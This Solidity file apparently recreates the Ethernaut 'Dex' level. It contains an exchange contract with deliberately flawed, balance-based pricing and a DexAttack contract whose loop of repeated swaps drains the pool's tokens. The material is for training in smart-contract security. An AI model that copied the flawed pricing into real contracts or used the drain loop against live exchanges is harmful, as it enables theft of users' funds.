// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/**
 * @title Dex (Ethernaut Level 22)
 * @notice A basic DEX contract that allows swapping between two tokens.
 *         The vulnerability is in the price calculation using balances,
 *         which can be manipulated to drain the DEX.
 */

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract Dex {
    address public token1;
    address public token2;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setTokens(address _token1, address _token2) public {
        require(msg.sender == owner, "Not owner");
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public {
        require(msg.sender == owner, "Not owner");
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(
            (from == token1 && to == token2) || (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return (amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

/**
 * @title DexAttack
 * @notice Exploit: Repeatedly swap between tokens to drain the DEX.
 *         The price formula (amount * toBalance / fromBalance) creates rounding
 *         that favors the attacker on each swap.
 */
contract DexAttack {
    Dex public dex;
    address public token1;
    address public token2;

    constructor(address _dex) {
        dex = Dex(_dex);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function attack() external {
        // Approve dex to spend our tokens
        IERC20(token1).approve(address(dex), type(uint256).max);
        IERC20(token2).approve(address(dex), type(uint256).max);

        // Repeatedly swap to drain
        while (
            IERC20(token1).balanceOf(address(dex)) > 0 &&
            IERC20(token2).balanceOf(address(dex)) > 0
        ) {
            uint256 bal1 = IERC20(token1).balanceOf(address(this));
            uint256 bal2 = IERC20(token2).balanceOf(address(this));

            uint256 dexBal1 = IERC20(token1).balanceOf(address(dex));
            uint256 dexBal2 = IERC20(token2).balanceOf(address(dex));

            if (bal1 > 0) {
                uint256 swapAmount = bal1;
                uint256 expectedOut = dex.getSwapPrice(token1, token2, swapAmount);
                if (expectedOut > dexBal2) {
                    // Calculate max we can swap without exceeding dex balance
                    swapAmount = (dexBal2 * dexBal1) / dexBal2;
                    if (swapAmount > bal1) swapAmount = bal1;
                }
                if (swapAmount > 0) {
                    dex.swap(token1, token2, swapAmount);
                }
            }

            // Refresh balances
            bal2 = IERC20(token2).balanceOf(address(this));
            dexBal1 = IERC20(token1).balanceOf(address(dex));
            dexBal2 = IERC20(token2).balanceOf(address(dex));

            if (bal2 > 0 && dexBal1 > 0) {
                uint256 swapAmount = bal2;
                uint256 expectedOut = dex.getSwapPrice(token2, token1, swapAmount);
                if (expectedOut > dexBal1) {
                    swapAmount = (dexBal1 * dexBal2) / dexBal1;
                    if (swapAmount > bal2) swapAmount = bal2;
                }
                if (swapAmount > 0) {
                    dex.swap(token2, token1, swapAmount);
                }
            }

            // Break if we can't make progress
            if (
                IERC20(token1).balanceOf(address(this)) == bal1 &&
                IERC20(token2).balanceOf(address(this)) == bal2
            ) break;
        }
    }
}
